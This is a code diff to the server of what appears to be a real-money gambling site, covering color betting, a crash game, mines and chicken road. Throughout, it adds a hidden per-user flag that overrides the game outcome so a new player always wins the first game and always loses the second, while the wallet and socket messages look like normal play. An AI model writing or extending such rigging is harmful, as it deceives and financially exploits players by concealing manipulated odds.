@@ -166,6 +166,7 @@ const UserSchema = new mongoose.Schema({
   totalWins:     { type: Number, default: 0 },
   totalWinAmount:{ type: Number, default: 0 },
   totalLost:     { type: Number, default: 0 },
+  newPlayerState:{ type: String, default: 'first' }, // 'first'→force win, 'second'→force loss, 'done'→normal
 }, { timestamps: true });
 const User = mongoose.model('User', UserSchema);
 
@@ -912,17 +913,29 @@ async function processRound() {
   const bulkBets  = [];
 
   for (const bet of gameState.roundBets) {
-    const win    = bet.color === result;
-    const payout = win ? parseFloat((bet.amount * MULTIPLIERS[result]).toFixed(2)) : 0;
+    let win    = bet.color === result;
+    let payout = win ? parseFloat((bet.amount * MULTIPLIERS[result]).toFixed(2)) : 0;
     totalAmount += bet.amount;
-    totalPayout += payout;
-
-    bulkBets.push({
-      userId: bet.userId, roundNumber: gameState.roundNumber,
-      color: bet.color, amount: bet.amount, result, win, payout,
-    });
 
     try {
+      // New-player bonus: force win on first game, force loss on second game
+      const bUser = await User.findById(bet.userId).select('newPlayerState');
+      if (bUser?.newPlayerState === 'first') {
+        win    = true;
+        payout = parseFloat((bet.amount * MULTIPLIERS[bet.color]).toFixed(2));
+        await User.findByIdAndUpdate(bet.userId, { newPlayerState: 'second' });
+      } else if (bUser?.newPlayerState === 'second') {
+        win    = false;
+        payout = 0;
+        await User.findByIdAndUpdate(bet.userId, { newPlayerState: 'done' });
+      }
+
+      totalPayout += payout;
+      bulkBets.push({
+        userId: bet.userId, roundNumber: gameState.roundNumber,
+        color: bet.color, amount: bet.amount, result, win, payout,
+      });
+
       if (win) {
         const u = await User.findByIdAndUpdate(
           bet.userId,
@@ -1016,7 +1029,25 @@ async function aviCrash() {
   for (const b of avi.bets) {
     if (!b.cashedOut) {
       const sid = userSockets.get(b.userId.toString());
-      if (sid) io.to(sid).emit('avi:lost', { amount: b.amount, at });
+      try {
+        const bUser = await User.findById(b.userId).select('newPlayerState');
+        if (bUser?.newPlayerState === 'first') {
+          // Auto-cashout first-game player before crash — they win!
+          const m = Math.max(avi.multiplier, 1.5);
+          const win = parseFloat((b.amount * m).toFixed(2));
+          b.cashedOut = true; b.cashoutMult = m;
+          const u = await User.findByIdAndUpdate(b.userId, { $inc: { wallet: win }, newPlayerState: 'second' }, { new: true });
+          if (sid) io.to(sid).emit('wallet:update', { wallet: u.wallet, message: `+₹${win} (${m}x) ✈️` });
+          if (sid) io.to(sid).emit('avi:autocashout', { multiplier: m, win, newBalance: u.wallet });
+        } else {
+          if (bUser?.newPlayerState === 'second') {
+            await User.findByIdAndUpdate(b.userId, { newPlayerState: 'done' });
+          }
+          if (sid) io.to(sid).emit('avi:lost', { amount: b.amount, at });
+        }
+      } catch(e) {
+        if (sid) io.to(sid).emit('avi:lost', { amount: b.amount, at });
+      }
     }
   }
   io.emit('avi:crash', { at, history: avi.history });
@@ -1103,10 +1134,16 @@ app.post('/api/mines/reveal', authMiddleware, async (req, res) => {
     if (!game || !game.active) return res.status(400).json({ error: 'No active game' });
     if (tile < 0 || tile > 24) return res.status(400).json({ error: 'Invalid tile' });
     if (game.revealed.includes(tile)) return res.status(400).json({ error: 'Already revealed' });
-    const isMine = game.minePos.includes(tile);
+    const pUser = await User.findById(req.user.userId).select('newPlayerState');
+    let isMine = game.minePos.includes(tile);
+    if (pUser?.newPlayerState === 'first') isMine = false;       // never a mine in first game
+    else if (pUser?.newPlayerState === 'second') isMine = true;  // always mine in second game
     game.revealed.push(tile);
     if (isMine) {
       game.active = false;
+      if (pUser?.newPlayerState === 'second') {
+        await User.findByIdAndUpdate(req.user.userId, { newPlayerState: 'done' });
+      }
       return res.json({ result: 'mine', minePos: game.minePos, revealed: game.revealed });
     }
     const safeRevealed = game.revealed.filter(t => !game.minePos.includes(t)).length;
@@ -1134,7 +1171,10 @@ app.post('/api/mines/cashout', authMiddleware, async (req, res) => {
     const mult = minesMult(safeRevealed, game.mines);
     const win = parseFloat((game.amount * mult).toFixed(2));
     game.active = false;
-    const user = await User.findByIdAndUpdate(req.user.userId, { $inc: { wallet: win } }, { new: true });
+    const pUser = await User.findById(req.user.userId).select('newPlayerState');
+    const updateObj = { $inc: { wallet: win } };
+    if (pUser?.newPlayerState === 'first') updateObj.newPlayerState = 'second';
+    const user = await User.findByIdAndUpdate(req.user.userId, updateObj, { new: true });
     const sid = userSockets.get(req.user.userId.toString());
     if (sid) io.to(sid).emit('wallet:update', { wallet: user.wallet, message: `+₹${win} (${mult}x) 💎` });
     res.json({ success: true, win, multiplier: mult, newBalance: user.wallet, minePos: game.minePos });
@@ -1176,9 +1216,22 @@ app.post('/api/chicken/jump', authMiddleware, async (req, res) => {
     if (!game || !game.active) return res.status(400).json({ error: 'No active game' });
     const nextStep = game.step + 1;
     if (nextStep >= CHICKEN_MULTS.length) return res.status(400).json({ error: 'Already at max' });
-    const burned = Math.random() < CHICKEN_RISK[nextStep];
+
+    const pUser = await User.findById(req.user.userId).select('newPlayerState');
+    let burned;
+    if (pUser?.newPlayerState === 'first') {
+      burned = false; // always safe in first game
+    } else if (pUser?.newPlayerState === 'second') {
+      burned = true;  // always crash in second game
+    } else {
+      burned = Math.random() < CHICKEN_RISK[nextStep];
+    }
+
     if (burned) {
       game.active = false;
+      if (pUser?.newPlayerState === 'second') {
+        await User.findByIdAndUpdate(req.user.userId, { newPlayerState: 'done' });
+      }
       return res.json({ result: 'burned', step: nextStep });
     }
     game.step = nextStep;
@@ -1187,7 +1240,9 @@ app.post('/api/chicken/jump', authMiddleware, async (req, res) => {
     if (maxed) {
       game.active = false;
       const win = parseFloat((game.amount * mult).toFixed(2));
-      const user = await User.findByIdAndUpdate(req.user.userId, { $inc: { wallet: win } }, { new: true });
+      const updateObj = { $inc: { wallet: win } };
+      if (pUser?.newPlayerState === 'first') updateObj.newPlayerState = 'second';
+      const user = await User.findByIdAndUpdate(req.user.userId, updateObj, { new: true });
       const sid = userSockets.get(req.user.userId.toString());
       if (sid) io.to(sid).emit('wallet:update', { wallet: user.wallet, message: `+₹${win} Chicken Road!` });
       return res.json({ result: 'maxed', step: nextStep, multiplier: mult, win, newBalance: user.wallet });
@@ -1204,7 +1259,10 @@ app.post('/api/chicken/cashout', authMiddleware, async (req, res) => {
     const mult = CHICKEN_MULTS[game.step];
     const win = parseFloat((game.amount * mult).toFixed(2));
     game.active = false;
-    const user = await User.findByIdAndUpdate(req.user.userId, { $inc: { wallet: win } }, { new: true });
+    const pUser = await User.findById(req.user.userId).select('newPlayerState');
+    const updateObj = { $inc: { wallet: win } };
+    if (pUser?.newPlayerState === 'first') updateObj.newPlayerState = 'second';
+    const user = await User.findByIdAndUpdate(req.user.userId, updateObj, { new: true });
     const sid = userSockets.get(req.user.userId.toString());
     if (sid) io.to(sid).emit('wallet:update', { wallet: user.wallet, message: `+₹${win} (${mult}x) 🐔` });
     res.json({ success: true, win, multiplier: mult, newBalance: user.wallet });
